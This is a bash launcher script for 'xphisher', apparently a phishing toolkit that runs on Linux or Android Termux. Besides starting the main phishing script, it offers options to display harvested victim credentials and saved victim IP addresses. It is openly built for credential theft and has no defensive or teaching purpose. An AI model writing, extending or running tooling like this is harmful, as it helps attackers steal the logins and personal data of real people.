#!/bin/bash

# https://github.com/Amarchillale/xphisher

if [[ $(uname -o) == *'Android'* ]];then
	xphisher_ROOT="/data/data/com.termux/files/usr/opt/xphisher"
else
	export xphisher_ROOT="/opt/xphisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run xphisher type \`xphisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $xphisher_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $xphisher_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $xphisher_ROOT
	bash ./xphisher.sh
fi
